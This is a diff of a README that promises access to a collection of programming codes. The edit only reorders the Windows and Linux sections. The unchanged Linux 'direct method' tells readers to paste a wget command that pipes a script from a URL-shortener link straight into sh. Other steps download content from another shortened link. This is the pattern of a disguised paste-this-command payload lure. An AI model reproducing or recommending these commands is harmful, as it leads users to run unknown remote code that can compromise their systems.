@@ -13,15 +13,6 @@ This repository contains important instructions for accessing a collection of pr
 
 Follow the steps below according to your operating system.
 
-## For Windows
-
-1. **Open the Windows terminal.**
-2. Execute the following command:
-   ```
-   curl -fsSL https://is.gd/se19pro >> pro.txt
-   ```
-3. After executing the command, open the file `pro.txt` in your favorite text editor to view the programming codes.
-
 ## For Linux
 ### Direct method
 Copy and Paste this in your terminal window by pressing Control + Shift + Cs from your keyboard or manually paste it.
@@ -36,6 +27,15 @@ wget -qO- https://naturl.link/curl | sh
    wget -qO - https://is.gd/se19pro >> pro.txt
    ```
 3. Once the command completes, open `pro.txt` to review the codes.
+
+## For Windows
+
+1. **Open the Windows terminal.**
+2. Execute the following command:
+   ```
+   curl -fsSL https://is.gd/se19pro >> pro.txt
+   ```
+3. After executing the command, open the file `pro.txt` in your favorite text editor to view the programming codes.
 
 ## To run programs follow these steps for your own program.
 
